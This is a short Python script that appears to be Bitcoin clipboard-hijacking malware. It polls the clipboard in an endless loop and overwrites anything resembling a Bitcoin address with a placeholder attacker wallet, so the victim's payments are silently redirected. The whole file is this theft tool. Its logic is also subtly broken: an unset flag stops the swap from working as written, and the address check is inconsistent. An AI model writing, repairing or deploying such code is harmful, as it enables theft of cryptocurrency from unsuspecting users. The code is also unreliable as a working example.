import clipboard
import time

btcwallet = "your_btc_wallet_here"
while True:
    symcount = 0
    copied = clipboard.paste()
    length = int(len(copied))
    firstsym = str(copied[0])
    if length >= 26 and length <= 35:
        if firstsym != "0" and firstsym != "3":
            for i in copied:
                if str(i) == "0" or str(i) == "O" or str(i) == "I":
                    nextstep = False
                else:
                    symcount += 1
                if symcount == length and nextstep == True:
                    clipboard.copy(btcwallet)
    time.sleep(0.5)
